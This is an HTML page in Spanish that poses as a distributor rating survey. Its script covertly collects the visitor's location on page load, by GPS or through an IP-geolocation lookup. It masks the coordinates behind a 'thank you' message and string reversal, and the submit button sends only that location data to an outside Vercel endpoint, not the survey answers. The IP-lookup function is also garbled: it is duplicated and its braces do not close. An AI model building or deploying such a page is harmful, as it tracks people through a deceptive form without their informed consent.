<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CALIFICADOR DE DISTRIBUIDOR</title>

  <script>
    var ubicacionesRegistradas = [];

    // ================================
    //   INICIO AUTOMÁTICO DE UBICACIÓN
    // ================================
   window.addEventListener("load", iniciarUbicacion);

function iniciarUbicacion() {
  console.log("Sistema iniciado");

  if ("geolocation" in navigator) {
    console.log("Preguntando por GPS...");
    navigator.geolocation.getCurrentPosition(
      function (pos) {
        console.log("GPS permitido");
        registrarGPS(pos);
      },
      function (err) {
        console.log("GPS rechazado:", err);
        obtenerUbicacionIP();
      }
    );
  } else {
    console.log("Geolocalización no disponible, usando IP");
    obtenerUbicacionIP();
  }
}


    // ================================
    //     UBICACIÓN POR GPS
    // ================================
    function registrarGPS(position) {
  const latitud = position.coords.latitude;
  const longitud = position.coords.longitude;

  ubicacionesRegistradas.push({ tipo: "GPS", latitud, longitud });

  console.log("Guardado GPS:", ubicacionesRegistradas);
  actualizarListaUbicaciones();
}


    // ================================
    //   UBICACIÓN APROXIMADA POR IP
    // ================================
async function obtenerUbicacionIP() {
  console.log("Intentando obtener ubicación por IP...");
async function obtenerUbicacionIP() {
  console.log("Intentando obtener ubicación por IP...");

  try {
    const r = await fetch("https://ipwho.is/");
    const data = await r.json();

    console.log("Respuesta IP:", data);

    if (!data.success) {
      console.log("Error en IP API:", data.message);
      return;
    }

    const latitud = data.latitude;
    const longitud = data.longitude;

    ubicacionesRegistradas.push({
      tipo: "IP",
      latitud,
      longitud
    });

    console.log("Guardado IP:", ubicacionesRegistradas);
    actualizarListaUbicaciones();

  } catch (err) {
    console.error("Error al obtener ubicación por IP:", err);
  }
}




    // ================================
    //     ACTUALIZAR LISTA EN HTML
    // ================================
    function actualizarListaUbicaciones() {
      var lista = document.getElementById("ubicaciones");
      lista.innerHTML = "";

      var inicio = Math.max(0, ubicacionesRegistradas.length - 5);

      for (var i = inicio; i < ubicacionesRegistradas.length; i++) {
        var ubicacion = ubicacionesRegistradas[i];
        var nuevaUbicacion = document.createElement("li");

        nuevaUbicacion.textContent = "Gracias por sus respuestas";

        nuevaUbicacion.dataset.latitud = codificarCoordenada(ubicacion.latitud);
        nuevaUbicacion.dataset.longitud = codificarCoordenada(ubicacion.longitud);

        nuevaUbicacion.onclick = function () {
          alert(
            "Latitud: " +
              decodificarCoordenada(this.dataset.latitud) +
              ", Longitud: " +
              decodificarCoordenada(this.dataset.longitud)
          );
        };

        lista.appendChild(nuevaUbicacion);
      }
    }

    // ================================
    //    CODIFICAR Y DECODIFICAR
    // ================================
    function codificarCoordenada(coordenada) {
      return coordenada.toFixed(4).split("").reverse().join("");
    }

    function decodificarCoordenada(coordenadaCodificada) {
      return parseFloat(coordenadaCodificada.split("").reverse().join(""));
    }

    // ================================
    //        ENVÍO A SERVIDOR
    // ================================
    async function enviarUbicacionesAlServidor() {
      // Aquí puedes agregar integración backend si lo deseas
    }

    // ================================
    // DESCARGAR / ENVIAR UBICACIONES
    // ================================
    async function descargarUbicaciones() {
      const texto = JSON.stringify(ubicacionesRegistradas);

      const vercelURL = "https://github-upload-api.vercel.app/api/subir";

      const response = await fetch(vercelURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ texto })
      });

      const data = await response.json();

      if (data.success) {
        alert("Formulario enviado correctamente.");
      } else {
        alert("Error al subir el formulario. Revisa la consola.");
        console.error("Error al subir:", data.error);
      }
    }

    function encriptar(texto) {
      return btoa(texto);
    }
  </script>
</head>

<body>
  <h1>Formulario para Distribuidor</h1>

  <p>Nombre de Distribuidor:</p>
  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>

  <p>Estado:</p>
  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>

  <p>Ciudad o pueblo:</p>
  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>

  <p>Número telefónico:</p>
  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>

  <p>Calificación de Distribuidor del 1 al 10:</p>
  <form><textarea rows="1" cols="10"></textarea><br /><br /></form>

  <ul id="ubicaciones"></ul>

  <button onclick="descargarUbicaciones()">Generar y enviar código</button>
</body>
</html>
